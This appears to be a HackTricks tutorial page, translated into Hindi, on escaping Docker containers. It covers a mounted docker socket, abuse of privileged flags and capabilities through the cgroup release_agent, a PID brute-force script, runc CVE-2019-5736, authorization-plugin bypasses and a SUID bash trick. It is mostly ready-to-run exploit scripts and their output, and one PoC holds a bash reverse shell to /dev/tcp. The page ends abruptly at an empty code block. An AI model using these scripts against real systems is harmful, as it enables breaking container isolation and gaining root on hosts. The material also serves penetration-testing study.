<details>

<summary><strong>AWS हैकिंग सीखें शून्य से लेकर हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें**, तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram group**](https://t.me/peass) में या **Twitter** 🐦 पर मुझे **फॉलो** करें [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में PRs सबमिट करके अपनी हैकिंग ट्रिक्स शेयर करें।

</details>


# कंटेनर क्या है

संक्षेप में, यह एक **अलग** **प्रक्रिया** है जो **cgroups** (प्रक्रिया क्या उपयोग कर सकती है, जैसे CPU और RAM) और **namespaces** (प्रक्रिया क्या देख सकती है, जैसे डायरेक्टरीज या अन्य प्रक्रियाएं) के माध्यम से:
```bash
docker run -dt --rm denial sleep 1234 #Run a large sleep inside a Debian container
ps -ef | grep 1234 #Get info about the sleep process
ls -l /proc/<PID>/ns #Get the Group and the namespaces (some may be uniq to the hosts and some may be shred with it)
```
# माउंटेड डॉकर सॉकेट

यदि आपको किसी तरह पता चलता है कि **डॉकर सॉकेट माउंटेड** है डॉकर कंटेनर के अंदर, तो आप उससे बाहर निकल पाएंगे।\
यह आमतौर पर उन डॉकर कंटेनरों में होता है जिन्हें किसी कारण से डॉकर डेमॉन से जुड़ने की आवश्यकता होती है क्रियाएं करने के लिए।
```bash
#Search the socket
find / -name docker.sock 2>/dev/null
#It's usually in /run/docker.sock
```
इस मामले में आप डॉकर डेमन से संवाद करने के लिए सामान्य डॉकर कमांड्स का उपयोग कर सकते हैं:
```bash
#List images to use one
docker images
#Run the image mounting the host disk and chroot on it
docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash
```
{% hint style="info" %}
यदि **docker socket अप्रत्याशित स्थान पर है**, तो आप इससे संवाद कर सकते हैं **`docker`** कमांड का उपयोग करके पैरामीटर **`-H unix:///path/to/docker.sock`** के साथ।
{% endhint %}

# कंटेनर क्षमताएँ

आपको कंटेनर की क्षमताओं की जाँच करनी चाहिए, यदि इसमें निम्नलिखित में से कोई भी है, तो आप इससे बच सकते हैं: **`CAP_SYS_ADMIN`**_,_ **`CAP_SYS_PTRACE`**, **`CAP_SYS_MODULE`**, **`DAC_READ_SEARCH`**, **`DAC_OVERRIDE`**

आप वर्तमान कंटेनर क्षमताओं की जाँच इस प्रकार कर सकते हैं:
```bash
capsh --print
```
निम्नलिखित पृष्ठ पर आप **लिनक्स क्षमताओं के बारे में और अधिक जान सकते हैं** और उनका दुरुपयोग कैसे करें:

{% content-ref url="linux-capabilities.md" %}
[linux-capabilities.md](linux-capabilities.md)
{% endcontent-ref %}

# `--privileged` फ्लैग

--privileged फ्लैग कंटेनर को होस्ट डिवाइसेस तक पहुँच प्रदान करता है।

## मैं रूट का मालिक हूँ

अच्छी तरह से कॉन्फ़िगर किए गए डॉकर कंटेनर **fdisk -l** जैसे कमांड की अनुमति नहीं देंगे। हालांकि, गलत कॉन्फ़िगर किए गए डॉकर कमांड में जहाँ --privileged फ्लैग निर्दिष्ट है, होस्ट ड्राइव को देखने के लिए विशेषाधिकार प्राप्त करना संभव है।

![](https://bestestredteam.com/content/images/2019/08/image-16.png)

तो होस्ट मशीन पर कब्जा करने के लिए, यह सरल है:
```bash
mkdir -p /mnt/hola
mount /dev/sda1 /mnt/hola
```
और लीजिये! अब आप होस्ट की फाइल सिस्टम तक पहुँच सकते हैं क्योंकि यह `/mnt/hola` फोल्डर में माउंट किया गया है।

{% code title="Initial PoC" %}
```bash
# spawn a new container to exploit via:
# docker run --rm -it --privileged ubuntu bash

d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o;
echo $t/c >$d/release_agent;
echo "#!/bin/sh $1 >$t/o" >/c;
chmod +x /c;
sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```
{% endcode %}

{% code title="दूसरा PoC" %}
```bash
# On the host
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash

# In the container
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent

#For a normal PoC =================
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#===================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/172.17.0.1/9000 0>&1" >> /cmd
chmod a+x /cmd
#===================================

sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
head /output
```
{% endcode %}

`--privileged` झंडा महत्वपूर्ण सुरक्षा चिंताओं को पेश करता है, और यह शोषण इसे सक्षम करके एक डॉकर कंटेनर लॉन्च करने पर निर्भर करता है। इस झंडे का उपयोग करते समय, कंटेनर्स को सभी उपकरणों तक पूर्ण पहुंच होती है और seccomp, AppArmor, और Linux क्षमताओं से प्रतिबंध नहीं होते हैं।

वास्तव में, `--privileged` इस विधि के माध्यम से एक डॉकर कंटेनर से बचने के लिए आवश्यक से कहीं अधिक अनुमतियां प्रदान करता है। वास्तविकता में, "केवल" आवश्यकताएं हैं:

1. हमें कंटेनर के अंदर रूट के रूप में चलना चाहिए
2. कंटेनर को `SYS_ADMIN` Linux क्षमता के साथ चलाया जाना चाहिए
3. कंटेनर में AppArmor प्रोफाइल की कमी होनी चाहिए, या अन्यथा `mount` सिस्टम कॉल की अनुमति होनी चाहिए
4. कंटेनर के अंदर cgroup v1 वर्चुअल फाइल सिस्टम को पढ़ने-लिखने के लिए माउंट किया जाना चाहिए

`SYS_ADMIN` क्षमता एक कंटेनर को माउंट सिस्टम कॉल करने की अनुमति देती है (देखें [man 7 capabilities](https://linux.die.net/man/7/capabilities))। [डॉकर मानक क्षमताओं के साथ कंटेनर्स को शुरू करता है](https://docs.docker.com/engine/security/security/#linux-kernel-capabilities) और `SYS_ADMIN` क्षमता को सक्षम नहीं करता है क्योंकि ऐसा करने के सुरक्षा जोखिम होते हैं।

इसके अलावा, डॉकर मानक रूप से `docker-default` AppArmor पॉलिसी के साथ कंटेनर्स को शुरू करता है, जो [माउंट सिस्टम कॉल के उपयोग को रोकता है](https://github.com/docker/docker-ce/blob/v18.09.8/components/engine/profiles/apparmor/template.go#L35) यहां तक कि जब कंटेनर `SYS_ADMIN` के साथ चलाया जाता है।

यदि कंटेनर को `--security-opt apparmor=unconfined --cap-add=SYS_ADMIN` झंडे के साथ चलाया जाता है तो वह इस तकनीक के लिए संवेदनशील होगा।

## प्रमाण संकल्पना को विभाजित करना

अब जब हम इस तकनीक का उपयोग करने के लिए आवश्यकताओं को समझते हैं और प्रमाण संकल्पना शोषण को परिष्कृत कर चुके हैं, आइए हम इसे लाइन-दर-लाइन चलकर देखें कि यह कैसे काम करता है।

इस शोषण को ट्रिगर करने के लिए हमें एक cgroup की आवश्यकता है जहां हम एक `release_agent` फाइल बना सकें और cgroup में सभी प्रक्रियाओं को मारकर `release_agent` आह्वान को ट्रिगर कर सकें। ऐसा करने का सबसे आसान तरीका है cgroup कंट्रोलर को माउंट करना और एक बाल cgroup बनाना।

इसके लिए, हम एक `/tmp/cgrp` निर्देशिका बनाते हैं, [RDMA](https://www.kernel.org/doc/Documentation/cgroup-v1/rdma.txt) cgroup कंट्रोलर को माउंट करते हैं और एक बाल cgroup (इस उदाहरण के लिए “x” नाम से) बनाते हैं। हालांकि हर cgroup कंट्रोलर का परीक्षण नहीं किया गया है, यह तकनीक अधिकांश cgroup कंट्रोलर्स के साथ काम करनी चाहिए।

यदि आप साथ चल रहे हैं और "mount: /tmp/cgrp: special device cgroup does not exist" प्राप्त करते हैं, तो यह इसलिए है क्योंकि आपकी सेटअप में RDMA cgroup कंट्रोलर नहीं है। इसे ठीक करने के लिए `rdma` को `memory` में बदलें। हम RDMA का उपयोग कर रहे हैं क्योंकि मूल PoC केवल इसके साथ काम करने के लिए डिज़ाइन किया गया था।

ध्यान दें कि cgroup कंट्रोलर्स वैश्विक संसाधन हैं जिन्हें विभिन्न अनुमतियों के साथ कई बार माउंट किया जा सकता है और एक माउंट में किए गए परिवर्तन दूसरे माउंट पर लागू होंगे।

नीचे हम “x” बाल cgroup निर्माण और इसकी निर्देशिका सूची देख सकते हैं।
```
root@b11cf9eab4fd:/# mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
root@b11cf9eab4fd:/# ls /tmp/cgrp/
cgroup.clone_children  cgroup.procs  cgroup.sane_behavior  notify_on_release  release_agent  tasks  x
root@b11cf9eab4fd:/# ls /tmp/cgrp/x
cgroup.clone_children  cgroup.procs  notify_on_release  rdma.current  rdma.max  tasks
```
आगे, हम "x" cgroup के रिलीज़ पर cgroup नोटिफिकेशन्स को सक्षम करते हैं उसकी `notify_on_release` फ़ाइल में 1 लिखकर। हम RDMA cgroup रिलीज़ एजेंट को भी सेट करते हैं ताकि वह `/cmd` स्क्रिप्ट को एक्जीक्यूट करे — जिसे हम बाद में कंटेनर में बनाएंगे — होस्ट पर `/cmd` स्क्रिप्ट पथ को `release_agent` फ़ाइल में लिखकर। इसे करने के लिए, हम कंटेनर का पथ होस्ट पर `/etc/mtab` फ़ाइल से प्राप्त करेंगे।

कंटेनर में हम जो फ़ाइलें जोड़ते हैं या संशोधित करते हैं, वे होस्ट पर मौजूद होती हैं, और दोनों दुनिया से उन्हें संशोधित करना संभव है: कंटेनर में उनका पथ और होस्ट पर उनका पथ।

नीचे दिए गए ऑपरेशन्स को देखा जा सकता है:
```
root@b11cf9eab4fd:/# echo 1 > /tmp/cgrp/x/notify_on_release
root@b11cf9eab4fd:/# host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
root@b11cf9eab4fd:/# echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
ध्यान दें `/cmd` स्क्रिप्ट के पथ पर, जिसे हम होस्ट पर बनाने वाले हैं:
```
root@b11cf9eab4fd:/# cat /tmp/cgrp/release_agent
/var/lib/docker/overlay2/7f4175c90af7c54c878ffc6726dcb125c416198a2955c70e186bf6a127c5622f/diff/cmd
```
अब, हम `/cmd` स्क्रिप्ट बनाते हैं ताकि यह `ps aux` कमांड को निष्पादित करे और उसके आउटपुट को होस्ट पर आउटपुट फाइल के पूर्ण पथ को निर्दिष्ट करते हुए कंटेनर पर `/output` में सेव करे। अंत में, हम `/cmd` स्क्रिप्ट को भी प्रिंट करते हैं ताकि उसकी सामग्री देख सकें:
```
root@b11cf9eab4fd:/# echo '#!/bin/sh' > /cmd
root@b11cf9eab4fd:/# echo "ps aux > $host_path/output" >> /cmd
root@b11cf9eab4fd:/# chmod a+x /cmd
root@b11cf9eab4fd:/# cat /cmd
#!/bin/sh
ps aux > /var/lib/docker/overlay2/7f4175c90af7c54c878ffc6726dcb125c416198a2955c70e186bf6a127c5622f/diff/output
```
अंत में, हम "x" चाइल्ड cgroup के अंदर तुरंत समाप्त होने वाली प्रक्रिया को उत्पन्न करके हमला कर सकते हैं। `/bin/sh` प्रक्रिया बनाकर और उसके PID को "x" चाइल्ड cgroup डायरेक्टरी में `cgroup.procs` फाइल में लिखकर, होस्ट पर स्क्रिप्ट `/bin/sh` के बाहर निकलने के बाद निष्पादित होगी। होस्ट पर किया गया `ps aux` का आउटपुट फिर कंटेनर के अंदर `/output` फाइल में सहेजा जाता है:
```
root@b11cf9eab4fd:/# sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
root@b11cf9eab4fd:/# head /output
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.1  1.0  17564 10288 ?        Ss   13:57   0:01 /sbin/init
root         2  0.0  0.0      0     0 ?        S    13:57   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        I<   13:57   0:00 [rcu_gp]
root         4  0.0  0.0      0     0 ?        I<   13:57   0:00 [rcu_par_gp]
root         6  0.0  0.0      0     0 ?        I<   13:57   0:00 [kworker/0:0H-kblockd]
root         8  0.0  0.0      0     0 ?        I<   13:57   0:00 [mm_percpu_wq]
root         9  0.0  0.0      0     0 ?        S    13:57   0:00 [ksoftirqd/0]
root        10  0.0  0.0      0     0 ?        I    13:57   0:00 [rcu_sched]
root        11  0.0  0.0      0     0 ?        S    13:57   0:00 [migration/0]
```
# `--privileged` flag v2

पिछले PoCs तब अच्छे से काम करते हैं जब कंटेनर को एक storage-driver के साथ कॉन्फ़िगर किया जाता है जो माउंट पॉइंट के पूरे होस्ट पथ को उजागर करता है, उदाहरण के लिए `overlayfs`, हालांकि हाल ही में मैं कुछ कॉन्फ़िगरेशनों से मिला जो स्पष्ट रूप से होस्ट फाइल सिस्टम माउंट पॉइंट को प्रकट नहीं करते थे।

## Kata Containers
```
root@container:~$ head -1 /etc/mtab
kataShared on / type 9p (rw,dirsync,nodev,relatime,mmap,access=client,trans=virtio)
```
[Kata Containers](https://katacontainers.io) मूल रूप से कंटेनर की रूट फाइल सिस्टम को `9pfs` के ऊपर माउंट करता है। यह Kata Containers वर्चुअल मशीन में कंटेनर फाइल सिस्टम के स्थान के बारे में कोई जानकारी प्रकट नहीं करता है।

\* Kata Containers के बारे में अधिक जानकारी भविष्य के ब्लॉग पोस्ट में।

## Device Mapper
```
root@container:~$ head -1 /etc/mtab
/dev/sdc / ext4 rw,relatime,stripe=384 0 0
```
मैंने एक लाइव वातावरण में इस रूट माउंट के साथ एक कंटेनर देखा, मुझे विश्वास है कि कंटेनर विशेष `devicemapper` स्टोरेज-ड्राइवर कॉन्फ़िगरेशन के साथ चल रहा था, लेकिन इस समय मैं इस व्यवहार को एक परीक्षण वातावरण में दोहराने में असमर्थ रहा हूँ।

## एक वैकल्पिक PoC

स्पष्ट रूप से इन मामलों में पर्याप्त जानकारी नहीं होती है कि होस्ट फाइल सिस्टम पर कंटेनर फाइलों का पथ पहचाना जा सके, इसलिए Felix का PoC जैसा है वैसा इस्तेमाल नहीं किया जा सकता। हालांकि, हम थोड़ी सूझबूझ के साथ इस हमले को अभी भी अंजाम दे सकते हैं।

आवश्यक एक मुख्य जानकारी यह है कि कंटेनर होस्ट के सापेक्ष पूर्ण पथ, एक फाइल का जिसे कंटेनर के भीतर निष्पादित करना है। कंटेनर के भीतर माउंट पॉइंट्स से इसे समझने में असमर्थ होने के कारण हमें और जगह देखना होगा।

### Proc से मदद <a href="proc-to-the-rescue" id="proc-to-the-rescue"></a>

लिनक्स `/proc` प्स्यूडो-फाइलसिस्टम एक सिस्टम पर चल रहे सभी प्रोसेस के कर्नेल प्रोसेस डेटा संरचनाओं को उजागर करता है, जिनमें विभिन्न नेमस्पेस में चल रहे प्रोसेस भी शामिल हैं, उदाहरण के लिए एक कंटेनर के भीतर। इसे एक कंटेनर में एक कमांड चलाकर और होस्ट पर प्रोसेस की `/proc` डायरेक्टरी तक पहुँचकर दिखाया जा सकता है:Container
```bash
root@container:~$ sleep 100
```

```bash
root@host:~$ ps -eaf | grep sleep
root     28936 28909  0 10:11 pts/0    00:00:00 sleep 100
root@host:~$ ls -la /proc/`pidof sleep`
total 0
dr-xr-xr-x   9 root root 0 Nov 19 10:03 .
dr-xr-xr-x 430 root root 0 Nov  9 15:41 ..
dr-xr-xr-x   2 root root 0 Nov 19 10:04 attr
-rw-r--r--   1 root root 0 Nov 19 10:04 autogroup
-r--------   1 root root 0 Nov 19 10:04 auxv
-r--r--r--   1 root root 0 Nov 19 10:03 cgroup
--w-------   1 root root 0 Nov 19 10:04 clear_refs
-r--r--r--   1 root root 0 Nov 19 10:04 cmdline
...
-rw-r--r--   1 root root 0 Nov 19 10:29 projid_map
lrwxrwxrwx   1 root root 0 Nov 19 10:29 root -> /
-rw-r--r--   1 root root 0 Nov 19 10:29 sched
...
```
_एक तरफ, `/proc/<pid>/root` डेटा संरचना एक ऐसी चीज है जिसने मुझे बहुत लंबे समय तक भ्रमित किया, मैं कभी नहीं समझ पाया कि `/` के लिए एक प्रतीकात्मक लिंक होना क्यों उपयोगी था, जब तक कि मैंने मैन पेजेस में वास्तविक परिभाषा नहीं पढ़ी:_

> /proc/\[pid]/root
>
> UNIX और Linux फाइलसिस्टम के प्रति-प्रक्रिया रूट के विचार का समर्थन करते हैं, जिसे chroot(2) सिस्टम कॉल द्वारा सेट किया जाता है। यह फाइल एक प्रतीकात्मक लिंक है जो प्रक्रिया के रूट डायरेक्टरी की ओर इशारा करता है, और exe और fd/\* के समान तरीके से व्यवहार करता है।
>
> हालांकि, ध्यान दें कि यह फाइल केवल एक प्रतीकात्मक लिंक नहीं है। यह फाइलसिस्टम का वही दृश्य प्रदान करती है (सहित namespaces और प्रति-प्रक्रिया माउंट्स का सेट) जैसा कि प्रक्रिया स्वयं।

`/proc/<pid>/root` प्रतीकात्मक लिंक का उपयोग किसी भी फाइल के लिए होस्ट सापेक्ष पथ के रूप में किया जा सकता है जो कि एक कंटेनर के भीतर है:Container
```bash
root@container:~$ echo findme > /findme
root@container:~$ sleep 100
```

```bash
root@host:~$ cat /proc/`pidof sleep`/root/findme
findme
```
इससे हमले के लिए आवश्यकता बदल जाती है, जिसमें कंटेनर होस्ट के सापेक्ष कंटेनर के भीतर एक फाइल के पूर्ण पथ को जानने से लेकर कंटेनर में चल रही _किसी भी_ प्रक्रिया के pid को जानने तक की जानकारी होती है।

### Pid Bashing <a href="pid-bashing" id="pid-bashing"></a>

यह वास्तव में आसान हिस्सा है, Linux में प्रक्रिया आईडी संख्यात्मक होती है और क्रमिक रूप से असाइन की जाती है। `init` प्रक्रिया को प्रक्रिया आईडी `1` असाइन की जाती है और सभी बाद की प्रक्रियाओं को बढ़ती हुई आईडी दी जाती है। कंटेनर के भीतर किसी प्रक्रिया की होस्ट प्रक्रिया आईडी की पहचान करने के लिए, एक ब्रूट फोर्स क्रमिक खोज का उपयोग किया जा सकता है:Container
```
root@container:~$ echo findme > /findme
root@container:~$ sleep 100
```
मेज़बान
```bash
root@host:~$ COUNTER=1
root@host:~$ while [ ! -f /proc/${COUNTER}/root/findme ]; do COUNTER=$((${COUNTER} + 1)); done
root@host:~$ echo ${COUNTER}
7822
root@host:~$ cat /proc/${COUNTER}/root/findme
findme
```
### सभी को एक साथ रखते हुए <a href="putting-it-all-together" id="putting-it-all-together"></a>

इस हमले को पूरा करने के लिए brute force तकनीक का उपयोग करके `/proc/<pid>/root/payload.sh` पथ के लिए pid का अनुमान लगाया जा सकता है, प्रत्येक पुनरावृत्ति में अनुमानित pid पथ को cgroups `release_agent` फ़ाइल में लिखा जाता है, `release_agent` को ट्रिगर किया जाता है, और देखा जाता है कि क्या एक आउटपुट फ़ाइल बनाई गई है।

इस तकनीक के साथ एकमात्र सावधानी यह है कि यह किसी भी तरह से सूक्ष्म नहीं है, और pid की गिनती को बहुत अधिक बढ़ा सकता है। चूंकि कोई भी लंबे समय तक चलने वाली प्रक्रियाएं चलती नहीं रहती हैं, इसलिए इसे _चाहिए_ कोई विश्वसनीयता समस्याएं पैदा नहीं करनी चाहिए, लेकिन इस पर मेरे शब्दों को उद्धृत न करें।

नीचे दिया गया PoC इन तकनीकों को लागू करता है ताकि Felix के मूल PoC में पहली बार प्रस्तुत की गई तुलना में एक अधिक सामान्य हमला प्रदान किया जा सके, जो कि cgroups `release_agent` कार्यक्षमता का उपयोग करके एक विशेषाधिकार प्राप्त कंटेनर से बचने के लिए है:
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

# Run a process for which we can search for (not needed in reality, but nice to have)
sleep 10000 &

# Prepare the payload script to execute on the host
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh

OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}

# Commands to run on the host<
ps -eaf > \${OUTPATH} 2>&1
__EOF__

# Make the payload script executable
chmod a+x ${PAYLOAD_PATH}

# Set up the cgroup mount using the memory resource cgroup controller
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

# Brute force the host pid until the output path is created, or we run out of guesses
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID} :-("
exit 1
fi
fi
# Set the release_agent path to the guessed pid
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
# Trigger execution of the release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

# Wait for and cat the output
sleep 1
echo "Done! Output:"
cat ${OUTPUT_PATH}
```
प्रिविलेज्ड कंटेनर के भीतर PoC को निष्पादित करने पर आपको इसी प्रकार का आउटपुट मिलना चाहिए:
```bash
root@container:~$ ./release_agent_pid_brute.sh
Checking pid 100
Checking pid 200
Checking pid 300
Checking pid 400
Checking pid 500
Checking pid 600
Checking pid 700
Checking pid 800
Checking pid 900
Checking pid 1000
Checking pid 1100
Checking pid 1200

Done! Output:
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 11:25 ?        00:00:01 /sbin/init
root         2     0  0 11:25 ?        00:00:00 [kthreadd]
root         3     2  0 11:25 ?        00:00:00 [rcu_gp]
root         4     2  0 11:25 ?        00:00:00 [rcu_par_gp]
root         5     2  0 11:25 ?        00:00:00 [kworker/0:0-events]
root         6     2  0 11:25 ?        00:00:00 [kworker/0:0H-kblockd]
root         9     2  0 11:25 ?        00:00:00 [mm_percpu_wq]
root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
...
```
# Runc exploit (CVE-2019-5736)

यदि आप root के रूप में `docker exec` को निष्पादित कर सकते हैं (संभवतः sudo के साथ), तो आप CVE-2019-5736 का दुरुपयोग करके कंटेनर से बाहर निकलकर विशेषाधिकार बढ़ाने का प्रयास कर सकते हैं (exploit [यहाँ](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go)). यह तकनीक मूल रूप से **host** के _**/bin/sh**_ बाइनरी को **कंटेनर से** **ओवरराइट** करेगी, इसलिए कोई भी जो docker exec को निष्पादित करता है, वह पेलोड को ट्रिगर कर सकता है।

पेलोड को अनुसार बदलें और `go build main.go` के साथ main.go को बिल्ड करें। परिणामी बाइनरी को निष्पादन के लिए डॉकर कंटेनर में रखा जाना चाहिए।\
निष्पादन पर, जैसे ही यह `[+] Overwritten /bin/sh successfully` दिखाता है, आपको होस्ट मशीन से निम्नलिखित निष्पादित करना होगा:

`docker exec -it <container-name> /bin/sh`

यह main.go फाइल में मौजूद पेलोड को ट्रिगर करेगा।

अधिक जानकारी के लिए: [https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)

# Docker Auth Plugin Bypass

कुछ मौकों पर, सिसएडमिन विशेषाधिकार बढ़ाने के बिना निम्न विशेषाधिकार वाले उपयोगकर्ताओं को डॉकर के साथ इंटरैक्ट करने से रोकने के लिए डॉकर में कुछ प्लगइन्स इंस्टॉल कर सकते हैं।

## disallowed `run --privileged`

इस मामले में सिसएडमिन ने **उपयोगकर्ताओं को वॉल्यूम्स माउंट करने और `--privileged` फ्लैग के साथ कंटेनर्स चलाने की अनुमति नहीं दी** या कंटेनर को कोई अतिरिक्त क्षमता नहीं दी:
```bash
docker run -d --privileged modified-ubuntu
docker: Error response from daemon: authorization denied by plugin customauth: [DOCKER FIREWALL] Specified Privileged option value is Disallowed.
See 'docker run --help'.
```
हालांकि, एक उपयोगकर्ता **कंटेनर के अंदर एक शेल बना सकता है और उसे अतिरिक्त विशेषाधिकार दे सकता है**:
```bash
docker run -d --security-opt "seccomp=unconfined" ubuntu
#bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de
docker exec -it --privileged bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de bash
```
अब, उपयोगकर्ता पहले चर्चा की गई तकनीकों में से किसी का उपयोग करके कंटेनर से बाहर निकल सकता है और होस्ट के अंदर विशेषाधिकार बढ़ा सकता है।

## माउंट लिखने योग्य फोल्डर

इस मामले में सिसएडमिन ने **उपयोगकर्ताओं को `--privileged` फ्लैग के साथ कंटेनर चलाने की अनुमति नहीं दी** या कंटेनर को कोई अतिरिक्त क्षमता नहीं दी, और उसने केवल `/tmp` फोल्डर माउंट करने की अनुमति दी:
```bash
host> cp /bin/bash /tmp #Cerate a copy of bash
host> docker run -it -v /tmp:/host ubuntu:18.04 bash #Mount the /tmp folder of the host and get a shell
docker container> chown root:root /host/bash
docker container> chmod u+s /host/bash
host> /tmp/bash
-p #This will give you a shell as root
```
{% hint style="info" %}
ध्यान दें कि शायद आप `/tmp` फोल्डर को माउंट नहीं कर सकते हैं लेकिन आप **अलग लिखने योग्य फोल्डर** को माउंट कर सकते हैं। लिखने योग्य निर्देशिकाओं को ढूँढने के लिए आप यह कमांड उपयोग कर सकते हैं: `find / -writable -type d 2>/dev/null`

**ध्यान दें कि लिनक्स मशीन की सभी निर्देशिकाएँ suid बिट का समर्थन नहीं करती हैं!** suid बिट का समर्थन करने वाली निर्देशिकाओं की जाँच करने के लिए `mount | grep -v "nosuid"` कमांड चलाएँ। उदाहरण के लिए आमतौर पर `/dev/shm`, `/run`, `/proc`, `/sys/fs/cgroup` और `/var/lib/lxcfs` suid बिट का समर्थन नहीं करते हैं।

यह भी ध्यान दें कि अगर आप **`/etc` माउंट कर सकते हैं** या कोई अन्य फोल्डर **जिसमें कॉन्फ़िगरेशन फाइलें होती हैं**, तो आप उन्हें डॉकर कंटेनर से रूट के रूप में बदल सकते हैं ताकि **होस्ट में उनका दुरुपयोग करके** विशेषाधिकार बढ़ा सकें (शायद `/etc/shadow` में बदलाव करके)
{% endhint %}

## Unchecked JSON Structure

यह संभव है कि जब सिसएडमिन ने डॉकर फ़ायरवॉल को कॉन्फ़िगर किया था तो उसने API के किसी **महत्वपूर्ण पैरामीटर** को भूल गया हो ([https://docs.docker.com/engine/api/v1.40/#operation/ContainerList](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList)) जैसे कि "**Binds**".\
निम्नलिखित उदाहरण में इस गलत कॉन्फ़िगरेशन का दुरुपयोग करके एक कंटेनर बनाना और चलाना संभव है जो होस्ट के रूट (/) फोल्डर को माउंट करता है:
```bash
docker version #First, find the API version of docker, 1.40 in this example
docker images #List the images available
#Then, a container that mounts the root folder of the host
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "Binds":["/:/host"]}' http:/v1.40/containers/create
docker start f6932bc153ad #Start the created privileged container
docker exec -it f6932bc153ad chroot /host bash #Get a shell inside of it
#You can access the host filesystem
```
## अनचेक्ड JSON एट्रिब्यूट

यह संभव है कि जब सिसएडमिन ने डॉकर फायरवॉल को कॉन्फ़िगर किया तो उसने API ([https://docs.docker.com/engine/api/v1.40/#operation/ContainerList](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList)) के किसी पैरामीटर के महत्वपूर्ण एट्रिब्यूट को **भूल गया** जैसे कि "**Capabilities**" जो कि "**HostConfig**" के अंदर होता है। निम्नलिखित उदाहरण में, इस मिसकॉन्फ़िगरेशन का दुरुपयोग करके **SYS_MODULE** क्षमता के साथ एक कंटेनर बनाने और चलाने की संभावना है:
```bash
docker version
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Capabilities":["CAP_SYS_MODULE"]}}' http:/v1.40/containers/create
docker start c52a77629a9112450f3dedd1ad94ded17db61244c4249bdfbd6bb3d581f470fa
docker ps
docker exec -it c52a77629a91 bash
capsh --print
#You can abuse the SYS_MODULE capability
```
# लिखने योग्य hostPath माउंट

([**यहाँ**](https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d) से जानकारी) कंटेनर के अंदर, हमलावर अंतर्निहित होस्ट OS तक और अधिक पहुँच प्राप्त करने का प्रयास कर सकता है जो क्लस्टर द्वारा बनाई गई एक लिखने योग्य hostPath वॉल्यूम के माध्यम से होता है। नीचे कुछ सामान्य चीजें हैं जिन्हें आप कंटेनर के अंदर जांच सकते हैं ताकि आप इस हमलावर वेक्टर का लाभ उठा सकें:
```bash
